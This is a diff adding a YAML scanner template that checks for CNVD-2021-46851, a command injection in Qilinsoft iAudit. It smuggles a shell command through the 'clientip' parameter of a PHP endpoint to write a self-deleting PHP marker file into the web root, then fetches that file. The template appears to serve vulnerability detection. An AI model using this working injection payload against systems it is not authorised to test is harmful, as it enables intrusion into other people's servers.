@@ -1,0 +1,28 @@
+id: yaml-poc-qilinsoft-iaudit-command_injection-CNVD-2021-46851
+info:
+  name: Yaml Poc Qilinsoft Iaudit Command_Injection Cnvd 2021 46851
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-qilinsoft-iaudit-command_injection-CNVD-2021-46851'
+  tags: rce
+  reference:
+  - https://yun.scdsjzx.cn/system/notice/detail/399d2dd0-94aa-4914-a8f6-e71f8dc8ac87
+http:
+- method: GET
+  path:
+  - /get_luser_by_sshport.php?clientip=1;echo%20"<?php%20echo%20md5({{r2}});unlink(__FILE__);?>">/opt/freesvr/web/htdocs/freesvr/audit/{{r2}}.php;&clientport=1
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /{{r2}}.php
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
